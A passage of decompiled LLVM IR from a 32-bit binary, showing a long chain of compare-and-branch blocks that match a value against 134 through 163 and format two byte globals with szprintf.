  %v0_804b92c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b92c = zext i8 %v0_804b92c to i32
  store i32 %v1_804b92c, i32* @edx, align 4
  %v0_804b936 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b936 = zext i8 %v0_804b936 to i32
  %v2_804b945 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b945, i32* @ebx, align 4
  %v4_804b957 = call i32 @szprintf(i32 %v2_804b945, i32 ptrtoint ([14 x i8]* @global_var_805975d.158 to i32), i32 %v1_804b936)
  br label %dec_label_pc_804b95c

dec_label_pc_804b95c:                             ; preds = %dec_label_pc_804b923, %dec_label_pc_804b92c
  %v13_804b95c = icmp eq i32 %v2_8049ce5, 134
  %v1_804b963 = icmp eq i1 %v13_804b95c, false
  br i1 %v1_804b963, label %dec_label_pc_804b995, label %dec_label_pc_804b965

dec_label_pc_804b965:                             ; preds = %dec_label_pc_804b95c
  %v0_804b965 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b965 = zext i8 %v0_804b965 to i32
  store i32 %v1_804b965, i32* @edx, align 4
  %v0_804b96f = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b96f = zext i8 %v0_804b96f to i32
  %v2_804b97e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b97e, i32* @ebx, align 4
  %v4_804b990 = call i32 @szprintf(i32 %v2_804b97e, i32 ptrtoint ([14 x i8]* @global_var_805976b.159 to i32), i32 %v1_804b96f)
  br label %dec_label_pc_804b995

dec_label_pc_804b995:                             ; preds = %dec_label_pc_804b95c, %dec_label_pc_804b965
  %v13_804b995 = icmp eq i32 %v2_8049ce5, 135
  %v1_804b99c = icmp eq i1 %v13_804b995, false
  br i1 %v1_804b99c, label %dec_label_pc_804b9ce, label %dec_label_pc_804b99e

dec_label_pc_804b99e:                             ; preds = %dec_label_pc_804b995
  %v0_804b99e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b99e = zext i8 %v0_804b99e to i32
  store i32 %v1_804b99e, i32* @edx, align 4
  %v0_804b9a8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b9a8 = zext i8 %v0_804b9a8 to i32
  %v2_804b9b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9b7, i32* @ebx, align 4
  %v4_804b9c9 = call i32 @szprintf(i32 %v2_804b9b7, i32 ptrtoint ([14 x i8]* @global_var_8059779.160 to i32), i32 %v1_804b9a8)
  br label %dec_label_pc_804b9ce

dec_label_pc_804b9ce:                             ; preds = %dec_label_pc_804b995, %dec_label_pc_804b99e
  %v13_804b9ce = icmp eq i32 %v2_8049ce5, 136
  %v1_804b9d5 = icmp eq i1 %v13_804b9ce, false
  br i1 %v1_804b9d5, label %dec_label_pc_804ba07, label %dec_label_pc_804b9d7

dec_label_pc_804b9d7:                             ; preds = %dec_label_pc_804b9ce
  %v0_804b9d7 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b9d7 = zext i8 %v0_804b9d7 to i32
  store i32 %v1_804b9d7, i32* @edx, align 4
  %v0_804b9e1 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b9e1 = zext i8 %v0_804b9e1 to i32
  %v2_804b9f0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9f0, i32* @ebx, align 4
  %v4_804ba02 = call i32 @szprintf(i32 %v2_804b9f0, i32 ptrtoint ([14 x i8]* @global_var_8059787.161 to i32), i32 %v1_804b9e1)
  br label %dec_label_pc_804ba07

dec_label_pc_804ba07:                             ; preds = %dec_label_pc_804b9ce, %dec_label_pc_804b9d7
  %v13_804ba07 = icmp eq i32 %v2_8049ce5, 137
  %v1_804ba0e = icmp eq i1 %v13_804ba07, false
  br i1 %v1_804ba0e, label %dec_label_pc_804ba40, label %dec_label_pc_804ba10

dec_label_pc_804ba10:                             ; preds = %dec_label_pc_804ba07
  %v0_804ba10 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ba10 = zext i8 %v0_804ba10 to i32
  store i32 %v1_804ba10, i32* @edx, align 4
  %v0_804ba1a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ba1a = zext i8 %v0_804ba1a to i32
  %v2_804ba29 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba29, i32* @ebx, align 4
  %v4_804ba3b = call i32 @szprintf(i32 %v2_804ba29, i32 ptrtoint ([13 x i8]* @global_var_8059795.162 to i32), i32 %v1_804ba1a)
  br label %dec_label_pc_804ba40

dec_label_pc_804ba40:                             ; preds = %dec_label_pc_804ba07, %dec_label_pc_804ba10
  %v13_804ba40 = icmp eq i32 %v2_8049ce5, 138
  %v1_804ba47 = icmp eq i1 %v13_804ba40, false
  br i1 %v1_804ba47, label %dec_label_pc_804ba79, label %dec_label_pc_804ba49

dec_label_pc_804ba49:                             ; preds = %dec_label_pc_804ba40
  %v0_804ba49 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ba49 = zext i8 %v0_804ba49 to i32
  store i32 %v1_804ba49, i32* @edx, align 4
  %v0_804ba53 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ba53 = zext i8 %v0_804ba53 to i32
  %v2_804ba62 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba62, i32* @ebx, align 4
  %v4_804ba74 = call i32 @szprintf(i32 %v2_804ba62, i32 ptrtoint ([13 x i8]* @global_var_80597a2.163 to i32), i32 %v1_804ba53)
  br label %dec_label_pc_804ba79

dec_label_pc_804ba79:                             ; preds = %dec_label_pc_804ba40, %dec_label_pc_804ba49
  %v13_804ba79 = icmp eq i32 %v2_8049ce5, 139
  %v1_804ba80 = icmp eq i1 %v13_804ba79, false
  br i1 %v1_804ba80, label %dec_label_pc_804bab2, label %dec_label_pc_804ba82

dec_label_pc_804ba82:                             ; preds = %dec_label_pc_804ba79
  %v0_804ba82 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ba82 = zext i8 %v0_804ba82 to i32
  store i32 %v1_804ba82, i32* @edx, align 4
  %v0_804ba8c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ba8c = zext i8 %v0_804ba8c to i32
  %v2_804ba9b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba9b, i32* @ebx, align 4
  %v4_804baad = call i32 @szprintf(i32 %v2_804ba9b, i32 ptrtoint ([13 x i8]* @global_var_80597af.164 to i32), i32 %v1_804ba8c)
  br label %dec_label_pc_804bab2

dec_label_pc_804bab2:                             ; preds = %dec_label_pc_804ba79, %dec_label_pc_804ba82
  %v13_804bab2 = icmp eq i32 %v2_8049ce5, 140
  %v1_804bab9 = icmp eq i1 %v13_804bab2, false
  br i1 %v1_804bab9, label %dec_label_pc_804baeb, label %dec_label_pc_804babb

dec_label_pc_804babb:                             ; preds = %dec_label_pc_804bab2
  %v0_804babb = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804babb = zext i8 %v0_804babb to i32
  store i32 %v1_804babb, i32* @edx, align 4
  %v0_804bac5 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bac5 = zext i8 %v0_804bac5 to i32
  %v2_804bad4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bad4, i32* @ebx, align 4
  %v4_804bae6 = call i32 @szprintf(i32 %v2_804bad4, i32 ptrtoint ([13 x i8]* @global_var_80597bc.165 to i32), i32 %v1_804bac5)
  br label %dec_label_pc_804baeb

dec_label_pc_804baeb:                             ; preds = %dec_label_pc_804bab2, %dec_label_pc_804babb
  %v13_804baeb = icmp eq i32 %v2_8049ce5, 141
  %v1_804baf2 = icmp eq i1 %v13_804baeb, false
  br i1 %v1_804baf2, label %dec_label_pc_804bb24, label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %dec_label_pc_804baeb
  %v0_804baf4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804baf4 = zext i8 %v0_804baf4 to i32
  store i32 %v1_804baf4, i32* @edx, align 4
  %v0_804bafe = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bafe = zext i8 %v0_804bafe to i32
  %v2_804bb0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb0d, i32* @ebx, align 4
  %v4_804bb1f = call i32 @szprintf(i32 %v2_804bb0d, i32 ptrtoint ([13 x i8]* @global_var_80597c9.166 to i32), i32 %v1_804bafe)
  br label %dec_label_pc_804bb24

dec_label_pc_804bb24:                             ; preds = %dec_label_pc_804baeb, %dec_label_pc_804baf4
  %v13_804bb24 = icmp eq i32 %v2_8049ce5, 142
  %v1_804bb2b = icmp eq i1 %v13_804bb24, false
  br i1 %v1_804bb2b, label %dec_label_pc_804bb5d, label %dec_label_pc_804bb2d

dec_label_pc_804bb2d:                             ; preds = %dec_label_pc_804bb24
  %v0_804bb2d = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bb2d = zext i8 %v0_804bb2d to i32
  store i32 %v1_804bb2d, i32* @edx, align 4
  %v0_804bb37 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bb37 = zext i8 %v0_804bb37 to i32
  %v2_804bb46 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb46, i32* @ebx, align 4
  %v4_804bb58 = call i32 @szprintf(i32 %v2_804bb46, i32 ptrtoint ([13 x i8]* @global_var_80597d6.167 to i32), i32 %v1_804bb37)
  br label %dec_label_pc_804bb5d

dec_label_pc_804bb5d:                             ; preds = %dec_label_pc_804bb24, %dec_label_pc_804bb2d
  %v13_804bb5d = icmp eq i32 %v2_8049ce5, 143
  %v1_804bb64 = icmp eq i1 %v13_804bb5d, false
  br i1 %v1_804bb64, label %dec_label_pc_804bb96, label %dec_label_pc_804bb66

dec_label_pc_804bb66:                             ; preds = %dec_label_pc_804bb5d
  %v0_804bb66 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bb66 = zext i8 %v0_804bb66 to i32
  store i32 %v1_804bb66, i32* @edx, align 4
  %v0_804bb70 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bb70 = zext i8 %v0_804bb70 to i32
  %v2_804bb7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb7f, i32* @ebx, align 4
  %v4_804bb91 = call i32 @szprintf(i32 %v2_804bb7f, i32 ptrtoint ([14 x i8]* @global_var_80596ed.150 to i32), i32 %v1_804bb70)
  br label %dec_label_pc_804bb96

dec_label_pc_804bb96:                             ; preds = %dec_label_pc_804bb5d, %dec_label_pc_804bb66
  %v10_804bb96 = icmp eq i32 %v2_8049ce5, 144
  %v1_804bb9d = icmp eq i1 %v10_804bb96, false
  br i1 %v1_804bb9d, label %dec_label_pc_804bbcf, label %dec_label_pc_804bb9f

dec_label_pc_804bb9f:                             ; preds = %dec_label_pc_804bb96
  %v0_804bb9f = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bb9f = zext i8 %v0_804bb9f to i32
  store i32 %v1_804bb9f, i32* @edx, align 4
  %v0_804bba9 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bba9 = zext i8 %v0_804bba9 to i32
  %v2_804bbb8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbb8, i32* @ebx, align 4
  %v4_804bbca = call i32 @szprintf(i32 %v2_804bbb8, i32 ptrtoint ([14 x i8]* @global_var_80597e3.168 to i32), i32 %v1_804bba9)
  br label %dec_label_pc_804bbcf

dec_label_pc_804bbcf:                             ; preds = %dec_label_pc_804bb96, %dec_label_pc_804bb9f
  %v13_804bbcf = icmp eq i32 %v2_8049ce5, 145
  %v1_804bbd6 = icmp eq i1 %v13_804bbcf, false
  br i1 %v1_804bbd6, label %dec_label_pc_804bc08, label %dec_label_pc_804bbd8

dec_label_pc_804bbd8:                             ; preds = %dec_label_pc_804bbcf
  %v0_804bbd8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bbd8 = zext i8 %v0_804bbd8 to i32
  store i32 %v1_804bbd8, i32* @edx, align 4
  %v0_804bbe2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bbe2 = zext i8 %v0_804bbe2 to i32
  %v2_804bbf1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbf1, i32* @ebx, align 4
  %v4_804bc03 = call i32 @szprintf(i32 %v2_804bbf1, i32 ptrtoint ([14 x i8]* @global_var_80597f1.169 to i32), i32 %v1_804bbe2)
  br label %dec_label_pc_804bc08

dec_label_pc_804bc08:                             ; preds = %dec_label_pc_804bbcf, %dec_label_pc_804bbd8
  %v13_804bc08 = icmp eq i32 %v2_8049ce5, 146
  %v1_804bc0f = icmp eq i1 %v13_804bc08, false
  br i1 %v1_804bc0f, label %dec_label_pc_804bc41, label %dec_label_pc_804bc11

dec_label_pc_804bc11:                             ; preds = %dec_label_pc_804bc08
  %v0_804bc11 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bc11 = zext i8 %v0_804bc11 to i32
  store i32 %v1_804bc11, i32* @edx, align 4
  %v0_804bc1b = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bc1b = zext i8 %v0_804bc1b to i32
  %v2_804bc2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc2a, i32* @ebx, align 4
  %v4_804bc3c = call i32 @szprintf(i32 %v2_804bc2a, i32 ptrtoint ([14 x i8]* @global_var_80597ff.170 to i32), i32 %v1_804bc1b)
  br label %dec_label_pc_804bc41

dec_label_pc_804bc41:                             ; preds = %dec_label_pc_804bc08, %dec_label_pc_804bc11
  %v13_804bc41 = icmp eq i32 %v2_8049ce5, 147
  %v1_804bc48 = icmp eq i1 %v13_804bc41, false
  br i1 %v1_804bc48, label %dec_label_pc_804bc7a, label %dec_label_pc_804bc4a

dec_label_pc_804bc4a:                             ; preds = %dec_label_pc_804bc41
  %v0_804bc4a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bc4a = zext i8 %v0_804bc4a to i32
  store i32 %v1_804bc4a, i32* @edx, align 4
  %v0_804bc54 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bc54 = zext i8 %v0_804bc54 to i32
  %v2_804bc63 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc63, i32* @ebx, align 4
  %v4_804bc75 = call i32 @szprintf(i32 %v2_804bc63, i32 ptrtoint ([13 x i8]* @global_var_805980d.171 to i32), i32 %v1_804bc54)
  br label %dec_label_pc_804bc7a

dec_label_pc_804bc7a:                             ; preds = %dec_label_pc_804bc41, %dec_label_pc_804bc4a
  %v13_804bc7a = icmp eq i32 %v2_8049ce5, 148
  %v1_804bc81 = icmp eq i1 %v13_804bc7a, false
  br i1 %v1_804bc81, label %dec_label_pc_804bcb3, label %dec_label_pc_804bc83

dec_label_pc_804bc83:                             ; preds = %dec_label_pc_804bc7a
  %v0_804bc83 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bc83 = zext i8 %v0_804bc83 to i32
  store i32 %v1_804bc83, i32* @edx, align 4
  %v0_804bc8d = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bc8d = zext i8 %v0_804bc8d to i32
  %v2_804bc9c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc9c, i32* @ebx, align 4
  %v4_804bcae = call i32 @szprintf(i32 %v2_804bc9c, i32 ptrtoint ([13 x i8]* @global_var_805981a.172 to i32), i32 %v1_804bc8d)
  br label %dec_label_pc_804bcb3

dec_label_pc_804bcb3:                             ; preds = %dec_label_pc_804bc7a, %dec_label_pc_804bc83
  %v13_804bcb3 = icmp eq i32 %v2_8049ce5, 149
  %v1_804bcba = icmp eq i1 %v13_804bcb3, false
  br i1 %v1_804bcba, label %dec_label_pc_804bcec, label %dec_label_pc_804bcbc

dec_label_pc_804bcbc:                             ; preds = %dec_label_pc_804bcb3
  %v0_804bcbc = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bcbc = zext i8 %v0_804bcbc to i32
  store i32 %v1_804bcbc, i32* @edx, align 4
  %v0_804bcc6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bcc6 = zext i8 %v0_804bcc6 to i32
  %v2_804bcd5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcd5, i32* @ebx, align 4
  %v4_804bce7 = call i32 @szprintf(i32 %v2_804bcd5, i32 ptrtoint ([14 x i8]* @global_var_8059827.173 to i32), i32 %v1_804bcc6)
  br label %dec_label_pc_804bcec

dec_label_pc_804bcec:                             ; preds = %dec_label_pc_804bcb3, %dec_label_pc_804bcbc
  %v13_804bcec = icmp eq i32 %v2_8049ce5, 150
  %v1_804bcf3 = icmp eq i1 %v13_804bcec, false
  br i1 %v1_804bcf3, label %dec_label_pc_804bd25, label %dec_label_pc_804bcf5

dec_label_pc_804bcf5:                             ; preds = %dec_label_pc_804bcec
  %v0_804bcf5 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bcf5 = zext i8 %v0_804bcf5 to i32
  store i32 %v1_804bcf5, i32* @edx, align 4
  %v0_804bcff = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bcff = zext i8 %v0_804bcff to i32
  %v2_804bd0e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd0e, i32* @ebx, align 4
  %v4_804bd20 = call i32 @szprintf(i32 %v2_804bd0e, i32 ptrtoint ([14 x i8]* @global_var_8059835.174 to i32), i32 %v1_804bcff)
  br label %dec_label_pc_804bd25

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bcec, %dec_label_pc_804bcf5
  %v13_804bd25 = icmp eq i32 %v2_8049ce5, 151
  %v1_804bd2c = icmp eq i1 %v13_804bd25, false
  br i1 %v1_804bd2c, label %dec_label_pc_804bd5e, label %dec_label_pc_804bd2e

dec_label_pc_804bd2e:                             ; preds = %dec_label_pc_804bd25
  %v0_804bd2e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bd2e = zext i8 %v0_804bd2e to i32
  store i32 %v1_804bd2e, i32* @edx, align 4
  %v0_804bd38 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bd38 = zext i8 %v0_804bd38 to i32
  %v2_804bd47 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd47, i32* @ebx, align 4
  %v4_804bd59 = call i32 @szprintf(i32 %v2_804bd47, i32 ptrtoint ([14 x i8]* @global_var_8059843.175 to i32), i32 %v1_804bd38)
  br label %dec_label_pc_804bd5e

dec_label_pc_804bd5e:                             ; preds = %dec_label_pc_804bd25, %dec_label_pc_804bd2e
  %v13_804bd5e = icmp eq i32 %v2_8049ce5, 152
  %v1_804bd65 = icmp eq i1 %v13_804bd5e, false
  br i1 %v1_804bd65, label %dec_label_pc_804bd97, label %dec_label_pc_804bd67

dec_label_pc_804bd67:                             ; preds = %dec_label_pc_804bd5e
  %v0_804bd67 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bd67 = zext i8 %v0_804bd67 to i32
  store i32 %v1_804bd67, i32* @edx, align 4
  %v0_804bd71 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bd71 = zext i8 %v0_804bd71 to i32
  %v2_804bd80 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd80, i32* @ebx, align 4
  %v4_804bd92 = call i32 @szprintf(i32 %v2_804bd80, i32 ptrtoint ([14 x i8]* @global_var_8059674.141 to i32), i32 %v1_804bd71)
  br label %dec_label_pc_804bd97

dec_label_pc_804bd97:                             ; preds = %dec_label_pc_804bd5e, %dec_label_pc_804bd67
  %v13_804bd97 = icmp eq i32 %v2_8049ce5, 153
  %v1_804bd9e = icmp eq i1 %v13_804bd97, false
  br i1 %v1_804bd9e, label %dec_label_pc_804bdd0, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd97
  %v0_804bda0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bda0 = zext i8 %v0_804bda0 to i32
  store i32 %v1_804bda0, i32* @edx, align 4
  %v0_804bdaa = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bdaa = zext i8 %v0_804bdaa to i32
  %v2_804bdb9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdb9, i32* @ebx, align 4
  %v4_804bdcb = call i32 @szprintf(i32 %v2_804bdb9, i32 ptrtoint ([13 x i8]* @global_var_8059851.176 to i32), i32 %v1_804bdaa)
  br label %dec_label_pc_804bdd0

dec_label_pc_804bdd0:                             ; preds = %dec_label_pc_804bd97, %dec_label_pc_804bda0
  %v13_804bdd0 = icmp eq i32 %v2_8049ce5, 154
  %v1_804bdd7 = icmp eq i1 %v13_804bdd0, false
  br i1 %v1_804bdd7, label %dec_label_pc_804be09, label %dec_label_pc_804bdd9

dec_label_pc_804bdd9:                             ; preds = %dec_label_pc_804bdd0
  %v0_804bdd9 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bdd9 = zext i8 %v0_804bdd9 to i32
  store i32 %v1_804bdd9, i32* @edx, align 4
  %v0_804bde3 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bde3 = zext i8 %v0_804bde3 to i32
  %v2_804bdf2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdf2, i32* @ebx, align 4
  %v4_804be04 = call i32 @szprintf(i32 %v2_804bdf2, i32 ptrtoint ([13 x i8]* @global_var_805985e.177 to i32), i32 %v1_804bde3)
  br label %dec_label_pc_804be09

dec_label_pc_804be09:                             ; preds = %dec_label_pc_804bdd0, %dec_label_pc_804bdd9
  %v13_804be09 = icmp eq i32 %v2_8049ce5, 155
  %v1_804be10 = icmp eq i1 %v13_804be09, false
  br i1 %v1_804be10, label %dec_label_pc_804be42, label %dec_label_pc_804be12

dec_label_pc_804be12:                             ; preds = %dec_label_pc_804be09
  %v0_804be12 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804be12 = zext i8 %v0_804be12 to i32
  store i32 %v1_804be12, i32* @edx, align 4
  %v0_804be1c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804be1c = zext i8 %v0_804be1c to i32
  %v2_804be2b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be2b, i32* @ebx, align 4
  %v4_804be3d = call i32 @szprintf(i32 %v2_804be2b, i32 ptrtoint ([13 x i8]* @global_var_805986b.178 to i32), i32 %v1_804be1c)
  br label %dec_label_pc_804be42

dec_label_pc_804be42:                             ; preds = %dec_label_pc_804be09, %dec_label_pc_804be12
  %v13_804be42 = icmp eq i32 %v2_8049ce5, 156
  %v1_804be49 = icmp eq i1 %v13_804be42, false
  br i1 %v1_804be49, label %dec_label_pc_804be7b, label %dec_label_pc_804be4b

dec_label_pc_804be4b:                             ; preds = %dec_label_pc_804be42
  %v0_804be4b = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804be4b = zext i8 %v0_804be4b to i32
  store i32 %v1_804be4b, i32* @edx, align 4
  %v0_804be55 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804be55 = zext i8 %v0_804be55 to i32
  %v2_804be64 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be64, i32* @ebx, align 4
  %v4_804be76 = call i32 @szprintf(i32 %v2_804be64, i32 ptrtoint ([13 x i8]* @global_var_8059878.179 to i32), i32 %v1_804be55)
  br label %dec_label_pc_804be7b

dec_label_pc_804be7b:                             ; preds = %dec_label_pc_804be42, %dec_label_pc_804be4b
  %v13_804be7b = icmp eq i32 %v2_8049ce5, 157
  %v1_804be82 = icmp eq i1 %v13_804be7b, false
  br i1 %v1_804be82, label %dec_label_pc_804beb4, label %dec_label_pc_804be84

dec_label_pc_804be84:                             ; preds = %dec_label_pc_804be7b
  %v0_804be84 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804be84 = zext i8 %v0_804be84 to i32
  store i32 %v1_804be84, i32* @edx, align 4
  %v0_804be8e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804be8e = zext i8 %v0_804be8e to i32
  %v2_804be9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be9d, i32* @ebx, align 4
  %v4_804beaf = call i32 @szprintf(i32 %v2_804be9d, i32 ptrtoint ([13 x i8]* @global_var_8059885.180 to i32), i32 %v1_804be8e)
  br label %dec_label_pc_804beb4

dec_label_pc_804beb4:                             ; preds = %dec_label_pc_804be7b, %dec_label_pc_804be84
  %v13_804beb4 = icmp eq i32 %v2_8049ce5, 158
  %v1_804bebb = icmp eq i1 %v13_804beb4, false
  br i1 %v1_804bebb, label %dec_label_pc_804beed, label %dec_label_pc_804bebd

dec_label_pc_804bebd:                             ; preds = %dec_label_pc_804beb4
  %v0_804bebd = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bebd = zext i8 %v0_804bebd to i32
  store i32 %v1_804bebd, i32* @edx, align 4
  %v0_804bec7 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bec7 = zext i8 %v0_804bec7 to i32
  %v2_804bed6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bed6, i32* @ebx, align 4
  %v4_804bee8 = call i32 @szprintf(i32 %v2_804bed6, i32 ptrtoint ([12 x i8]* @global_var_8059892.181 to i32), i32 %v1_804bec7)
  br label %dec_label_pc_804beed

dec_label_pc_804beed:                             ; preds = %dec_label_pc_804beb4, %dec_label_pc_804bebd
  %v13_804beed = icmp eq i32 %v2_8049ce5, 159
  %v1_804bef4 = icmp eq i1 %v13_804beed, false
  br i1 %v1_804bef4, label %dec_label_pc_804bf26, label %dec_label_pc_804bef6

dec_label_pc_804bef6:                             ; preds = %dec_label_pc_804beed
  %v0_804bef6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bef6 = zext i8 %v0_804bef6 to i32
  store i32 %v1_804bef6, i32* @edx, align 4
  %v0_804bf00 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bf00 = zext i8 %v0_804bf00 to i32
  %v2_804bf0f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf0f, i32* @ebx, align 4
  %v4_804bf21 = call i32 @szprintf(i32 %v2_804bf0f, i32 ptrtoint ([14 x i8]* @global_var_805989e.182 to i32), i32 %v1_804bf00)
  br label %dec_label_pc_804bf26

dec_label_pc_804bf26:                             ; preds = %dec_label_pc_804beed, %dec_label_pc_804bef6
  %v10_804bf26 = icmp eq i32 %v2_8049ce5, 160
  %v1_804bf2d = icmp eq i1 %v10_804bf26, false
  br i1 %v1_804bf2d, label %dec_label_pc_804bf5f, label %dec_label_pc_804bf2f

dec_label_pc_804bf2f:                             ; preds = %dec_label_pc_804bf26
  %v0_804bf2f = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bf2f = zext i8 %v0_804bf2f to i32
  store i32 %v1_804bf2f, i32* @edx, align 4
  %v0_804bf39 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bf39 = zext i8 %v0_804bf39 to i32
  %v2_804bf48 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf48, i32* @ebx, align 4
  %v4_804bf5a = call i32 @szprintf(i32 %v2_804bf48, i32 ptrtoint ([13 x i8]* @global_var_80598ac.183 to i32), i32 %v1_804bf39)
  br label %dec_label_pc_804bf5f

dec_label_pc_804bf5f:                             ; preds = %dec_label_pc_804bf26, %dec_label_pc_804bf2f
  %v13_804bf5f = icmp eq i32 %v2_8049ce5, 161
  %v1_804bf66 = icmp eq i1 %v13_804bf5f, false
  br i1 %v1_804bf66, label %dec_label_pc_804bf98, label %dec_label_pc_804bf68

dec_label_pc_804bf68:                             ; preds = %dec_label_pc_804bf5f
  %v0_804bf68 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bf68 = zext i8 %v0_804bf68 to i32
  store i32 %v1_804bf68, i32* @edx, align 4
  %v0_804bf72 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bf72 = zext i8 %v0_804bf72 to i32
  %v2_804bf81 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf81, i32* @ebx, align 4
  %v4_804bf93 = call i32 @szprintf(i32 %v2_804bf81, i32 ptrtoint ([14 x i8]* @global_var_80598b9.184 to i32), i32 %v1_804bf72)
  br label %dec_label_pc_804bf98

dec_label_pc_804bf98:                             ; preds = %dec_label_pc_804bf5f, %dec_label_pc_804bf68
  %v13_804bf98 = icmp eq i32 %v2_8049ce5, 162
  %v1_804bf9f = icmp eq i1 %v13_804bf98, false
  br i1 %v1_804bf9f, label %dec_label_pc_804bfd1, label %dec_label_pc_804bfa1

dec_label_pc_804bfa1:                             ; preds = %dec_label_pc_804bf98
  %v0_804bfa1 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bfa1 = zext i8 %v0_804bfa1 to i32
  store i32 %v1_804bfa1, i32* @edx, align 4
  %v0_804bfab = load i8, i8* @global_var_805e499.29, align 1
  %v1_804bfab = zext i8 %v0_804bfab to i32
  %v2_804bfba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfba, i32* @ebx, align 4
  %v4_804bfcc = call i32 @szprintf(i32 %v2_804bfba, i32 ptrtoint ([14 x i8]* @global_var_80598c7.185 to i32), i32 %v1_804bfab)
  br label %dec_label_pc_804bfd1

dec_label_pc_804bfd1:                             ; preds = %dec_label_pc_804bf98, %dec_label_pc_804bfa1
  %v13_804bfd1 = icmp eq i32 %v2_8049ce5, 163
  %v1_804bfd8 = icmp eq i1 %v13_804bfd1, false
  br i1 %v1_804bfd8, label %dec_label_pc_804c00a, label %dec_label_pc_804bfda

dec_label_pc_804bfda:                             ; preds = %dec_label_pc_804bfd1
  %v0_804bfda = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804bfda = zext i8 %v0_804bfda to i32
  store i32 %v1_804bfda, i32* @edx, align 4
  %v0_804bfe4 = load i8, i8* @global_var_805e499.29, align 1
